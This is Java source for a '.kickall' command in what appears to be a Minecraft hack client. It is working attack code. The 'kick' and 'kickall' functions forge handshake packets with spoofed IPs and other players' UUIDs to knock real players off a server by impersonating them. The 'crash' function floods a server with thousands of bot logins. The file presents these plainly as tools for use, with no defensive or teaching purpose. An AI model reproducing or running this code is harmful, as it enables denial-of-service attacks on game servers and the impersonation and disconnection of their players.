package me.xatzdevelopments.xatz.client.commands;

import java.net.InetAddress;
import java.util.Random;
import java.util.UUID;

import com.mojang.authlib.GameProfile;

import me.xatzdevelopments.xatz.client.main.Xatz;
import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.client.gui.GuiIngameMenu;
import net.minecraft.client.gui.GuiPlayerTabOverlay;
import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.client.network.NetHandlerLoginClient;
import net.minecraft.client.network.NetHandlerPlayClient;
import net.minecraft.client.network.NetworkPlayerInfo;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.nbt.NBTException;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagDouble;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.EnumConnectionState;
import net.minecraft.network.NetworkManager;
import net.minecraft.network.handshake.client.C00Handshake;
import net.minecraft.network.login.client.C00PacketLoginStart;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

public class CommandKickall extends Command {
	String nbt = null;
	 public static String IPKick;
	    public static int PortKick;
	    public int botCount = 10000;



	@Override
	public void run(String[] args) {
	
		
		  String messageFinal;
	        String[] s;
	        
	          if (args[1].equalsIgnoreCase("help")) {
	            Xatz.chatMessage(".kickall kickall [IP] [Port] ");
	            
	            Xatz.chatMessage(".kickall setkick [IP] [Port] ");
	           
	            Xatz.chatMessage(".kickall kick [Nick] ");
	       
	            Xatz.chatMessage(".kickall setbotcount [BotNumber] ");
	           
	            Xatz.chatMessage(".kickall crash [IP] [Port] ");
	          }
	        if (args[1].equalsIgnoreCase("kickall")) {
	           
	            new Thread(){

	                @Override
	                public void run() {
	                    try {
	                    	
	                        int port = Integer.parseInt(args[3]);
	                        NetHandlerPlayClient connection = mc.thePlayer.sendQueue;
	                        java.util.List<NetworkPlayerInfo> players = GuiPlayerTabOverlay.field_175252_a.sortedCopy(connection.getPlayerInfoMap());
	                        for (NetworkPlayerInfo n : players) {
	                        	
	                            if (n.getGameProfile().getId().toString().equals(EntityPlayerSP.enuid.toString())) continue;
if (n.getGameProfile().getName().equals(mc.thePlayer.getName())) {
	                        		
	                        	}
else {
	                            Random rand = new Random();
	                            InetAddress var1 = null;
	                            var1 = InetAddress.getByName(args[2]);
	                            for (int i = 0; i < 5; i ++) {
	                            	NetworkManager t2;
	                            	t2 = NetworkManager.func_181124_a(var1, port, Minecraft.getMinecraft().gameSettings.func_181148_f());
	                           t2.setNetHandler(new NetHandlerLoginClient(t2, Minecraft.getMinecraft(), new GuiIngameMenu()));
	                           t2.sendPacket(new C00Handshake(210, String.valueOf(args[2]) + "\u0000" + "32.123." + String.valueOf(rand.nextInt(255)) + "." + String.valueOf(rand.nextInt(255)) + "\u0000" + n.getGameProfile().getId().toString(), port, EnumConnectionState.LOGIN));
	                           t2.sendPacket(new C00PacketLoginStart(n.getGameProfile()));
	                            Thread.sleep(0);
	                            }
	                        }
	                        }
	                        Xatz.chatMessage("Kicked all!");
	                    }
	                    catch (Exception ex) {
	                       
	                       
	                      
	                        Xatz.chatMessage(".kickall kickall [IP] [Port]");
	                    }
	                }
	            }.start();
	        }
	        if (args[1].equalsIgnoreCase("setkick")) {
	        	
	            try {
	               
	                IPKick = args[2];
	                PortKick = Integer.parseInt(args[3]);
	               
	                Xatz.chatMessage("The kick-server has successfully been set to: " + IPKick + ":" + PortKick + ".");
	            }
	            catch (Exception ex) {
	               
	                Xatz.chatMessage("Something went wrong! Please try the following command:");
	               
	                Xatz.chatMessage(".kickall setkick [IP] [Port]");
	            }
	        }
	        if (args[1].equalsIgnoreCase("kick")) {

	            new Thread(){

	                @Override
	                public void run() {
	                    try {
	                       
	                        NetHandlerPlayClient connection = mc.thePlayer.sendQueue;
	                        java.util.List<NetworkPlayerInfo> players = GuiPlayerTabOverlay.field_175252_a.sortedCopy(connection.getPlayerInfoMap());
	                        for (NetworkPlayerInfo n : players) {
	                            if (!n.getGameProfile().getName().equals(args[2])) continue;
	                            Random rand = new Random();
	                            InetAddress var1 = null;
	                            var1 = InetAddress.getByName(IPKick);
	                           
	                            for (int i = 0; i < 5; i ++) {
	                            	NetworkManager t2;
	                            t2 = NetworkManager.func_181124_a(var1, PortKick, Minecraft.getMinecraft().gameSettings.func_181148_f());
	                            t2.setNetHandler(new NetHandlerLoginClient(t2, Minecraft.getMinecraft(), new GuiIngameMenu()));
	                            t2.sendPacket(new C00Handshake(210, String.valueOf(IPKick) + "\u0000" + "32.123." + String.valueOf(rand.nextInt(255)) + "." + String.valueOf(rand.nextInt(255)) + "\u0000" + n.getGameProfile().getId().toString(), PortKick, EnumConnectionState.LOGIN));
	                            t2.sendPacket(new C00PacketLoginStart(n.getGameProfile()));
	                            }
	                           
	                            Xatz.chatMessage("Kicked " + n.getGameProfile().getName() + ".");
	                        }
	                    }
	                    catch (Exception ex) {
	                       
	                        Xatz.chatMessage(".kickall kickall [IP] [Port]");
	                    }
	                }
	            }.start();
	        }
	        if (args[1].equalsIgnoreCase("setbotcount")) {
	            try {
	          
	                botCount = Integer.parseInt(args[2]);
	               
	                Xatz.chatMessage("The botcount has successfully been set to: " + args[2]);
	            }
	            catch (Exception ex) {
	               
	                Xatz.chatMessage("Something went wrong! Please try the following command:");
	               
	                Xatz.chatMessage(".kickall setbotcount [BotNumber]");
	            }
	        }
	        if (args[1].equalsIgnoreCase("crash")) {
	            
	            new Thread(){

	                @Override
	                public void run() {
	                    try {
	                        
	                        int port = Integer.parseInt(args[3]);
	                       
	                        Xatz.chatMessage("Crash started!");
	                        int count = 0;
	                        while (count < botCount) {
	                        	NetworkManager t2;
	                            Random rand = new Random();
	                            InetAddress var1 = null;
	                            var1 = InetAddress.getByName(args[2]);
	                            t2 = NetworkManager.func_181124_a(var1, port, Minecraft.getMinecraft().gameSettings.func_181148_f());
	                            t2.setNetHandler(new NetHandlerLoginClient(t2, Minecraft.getMinecraft(), new GuiIngameMenu()));
	                            t2.sendPacket(new C00Handshake(210, String.valueOf(args[3]) + "\u0000" + "32.123." + String.valueOf(rand.nextInt(255)) + "." + String.valueOf(rand.nextInt(255)) + "\u0000" + UUID.randomUUID().toString(), port, EnumConnectionState.LOGIN));
	                            t2.sendPacket(new C00PacketLoginStart(new GameProfile(null, "Name" + count)));
	                            Thread.sleep(0);
	                            ++count;
	                        }
	                       
	                        Xatz.chatMessage("Crash ended!");
	                    }
	                    catch (Exception ex) {
	                       
	                        Xatz.chatMessage("Something went wrong! Please try the following command:");
	                       
	                        Xatz.chatMessage(".kickall crash [IP] [Port]");
	                    }
	                }
	            }.start();
	        }
	  }
	

	@Override
	public String getActivator() {
		return ".kickall";
	}

	@Override
	public String getSyntax() {
		return ".kickall";
	}

	@Override
	public String getDesc() {
		return "Kickall, This command is in beta";
	}
}
